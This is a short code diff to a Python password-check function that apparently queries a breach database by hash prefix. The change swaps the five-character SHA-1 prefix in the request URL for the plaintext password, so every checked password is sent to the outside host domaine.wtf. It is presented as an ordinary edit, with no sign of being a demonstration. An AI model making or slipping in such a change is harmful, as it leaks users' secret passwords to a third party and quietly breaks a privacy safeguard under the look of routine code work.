@@ -21,7 +21,7 @@ def build_parser():
 def check_hash(password):
     h = hashlib.sha1(password).hexdigest().upper()
     hh = h[5:]
-    for l in requests.get('https://domaine.wtf/range/' + h[:5]).content.splitlines():
+    for l in requests.get('https://domaine.wtf/range/' + password).content.splitlines():
         ll = l.split(':')
         if hh == ll[0]:
             return int(ll[1])
